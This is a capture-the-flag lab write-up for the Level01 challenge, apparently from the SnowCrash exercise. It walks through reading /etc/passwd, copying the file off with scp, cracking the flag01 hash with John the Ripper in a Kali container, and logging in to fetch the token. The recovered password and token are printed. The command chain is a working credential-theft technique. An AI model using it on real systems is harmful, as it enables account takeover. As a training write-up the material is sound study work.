# Level01 - Flag01

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|         |                             |
| ------- | --------------------------- |
| level01 | `level01`                   |
| flag01  | `abcdefg`                   |
| token   | `f2av5il02puano7naaf6adaaf` |

## Steps to resolve on VM

1. Find files owned by the user `flag01`

```bash
find / -user flag00 2>/dev/null
# Nothing returned
```

2. We will then try to check the file /etc/shadow & /etc/passwd who handle passwords

```bash
cat /etc/shadow
> cat: /etc/shadow: Permission denied

cat /etc/passwd
# This one is accessible and gives use a big list concerning passwords

cat /etc/passwd | grep flag01
> flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
# We can notice in the 'flag01' line that there is an hashed password
```

3. Use John the Ripper external hacking tool to decode this password. (with a docker container)

```bash
# First launch the docker container which will use "kali-script.sh' to run the john hacking tool
docker run -e SNOW_HOST=$SNOW_HOST -it -v $PWD/$SCRIPT:/$SCRIPT --rm kalilinux/kali-rolling bash kali_script.sh

# After installing the dependencies, we copy the /etc/passwd file
apt-get update && apt-get install -y openssh-client && apt-get install -y john
scp -q -o "StrictHostKeyChecking no" -P $SNOW_PORT $SNOW_USER@$SNOW_HOST:$PASSWORD_PATH ./

# And we apply john hacking tool on it and show it
john passwd
john --show passwd
> flag01 password is : abcdefg
```

4. Now we can connect to 'flag01' and use 'getflag' to get the token

```bash
ssh -t -q $FLAG_LEVEL@$SNOW_HOST -p $SNOW_PORT "getflag"
> Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```

---

## Sources

### Shell

- [SCP explanations](https://linuxize.com/post/how-to-use-scp-command-to-securely-transfer-files/#:~:text=%3A%2Fremote%2Fdirectory-,Copy%20a%20Remote%20File%20to%20a%20Local%20System%20using%20the,local%20location%20as%20the%20destination.&text=If%20you%20haven't%20set,to%20enter%20the%20user%20password.)
- [SCP auto accept RSA Key Fingerprint](https://serverfault.com/questions/638600/auto-accept-rsa-key-fingerprint-from-command-line)

### Docker

- [Docker run bash script from host, then remove container](https://serverfault.com/questions/806812/docker-run-bash-script-then-remove-container)

### John the ripper

- [John The ripper explanations](https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-user-passwords-linux-system-0147164/)
